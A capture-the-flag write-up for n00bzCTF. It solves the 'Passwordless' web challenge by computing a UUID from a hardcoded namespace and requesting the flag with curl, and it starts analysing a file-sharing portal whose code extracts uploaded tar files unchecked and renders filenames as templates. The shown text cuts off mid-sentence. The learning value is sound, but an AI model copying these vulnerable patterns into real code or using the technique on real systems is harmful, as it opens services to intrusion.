![image](https://github.com/user-attachments/assets/7f71b75b-48af-44bd-98be-143cd5ef4c7f)* * *
### CTF: n00bzCTF

* * *

### Challeges

- Web:
  - Passwordless
  - File Sharing Portal

- Crypto:
  - Vinegar

- Rev:
  - Vacation

### Web:

- Passwordless

   ![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)

- Explaining the source code:

        #!/usr/bin/env python3
      from flask import Flask, request, redirect, render_template, render_template_string
      import subprocess
      import urllib
      import uuid
      global leet
      
      app = Flask(__name__)
      flag = open('/flag.txt').read()
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      
      @app.route('/',methods=['GET','POST'])
      def main():
          global username
          if request.method == 'GET':
              return render_template('index.html')
          elif request.method == 'POST':
              username = request.values['username']
              if username == 'admin123':
                  return 'Stop trying to act like you are the admin!'
              uid = uuid.uuid5(leet,username) # super secure!
              return redirect(f'/{uid}')
      
      @app.route('/<uid>')
      def user_page(uid):
          if uid != str(uuid.uuid5(leet,'admin123')):
              return f'Welcome! No flag for you :('
          else:
              return flag
      
      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=1337)

- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is already hardocded which is a vulnerability.If the uid is added to the route, it reveals the flag.

      #Leet uid
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      if uid != str(uuid.uuid5(leet,'admin123')):
                return f'Welcome! No flag for you :('
            else:
                return flag

- Creating the uid with python `uuid` module

        ❯ python3
      Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
      Type "help", "copyright", "credits" or "license" for more information.
      >>> import uuid
      >>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      >>> str(uuid.uuid5(leet,'admin123'))
      '3c68e6cc-15a7-59d4-823c-e7563bbb326c'
      >>> 

- Grabbing the flag with curl

         ❯ curl http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c
      n00bz{1337-13371337-1337-133713371337-1337}


### File Sharing Portal

 ![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)

### Source Code Analysis/

- The index page `/` accepts upload of only tarfiles, removes the name  and replace it with a sha256 generated hash of a random value,the server uses the `tarfile` module to extract the file,places it in a directory named after the name hash and creates an hyperlink to access the extracted files.

      elif request.method == 'POST':
            file = request.files['file']
            if file.filename[-4:] != '.tar':
                return render_template_string("<p> We only support tar files as of right now!</p>")
            name = sha256(os.urandom(16)).digest().hex()
            os.makedirs(f"./uploads/{name}", exist_ok=True)
            file.save(f"./uploads/{name}/{name}.tar")
            try:
                tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
                tar_file.extractall(path=f'./uploads/{name}/')
                return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")

- The `/view/<name` checks if all the characters are within the range `a-f0-9` and it appears otherwise, it triggers an error.Then, it uses `os.listdir()` to list the directory of the extracted tar file which is stored in a `list`.Then, it uses this `f'<a href="/read/{name}/{i}">{i}</a>'` line to create an hyperlink to each extracted files. The server uses the function `render_template_string()` to render the html code.Although, the du


  
 
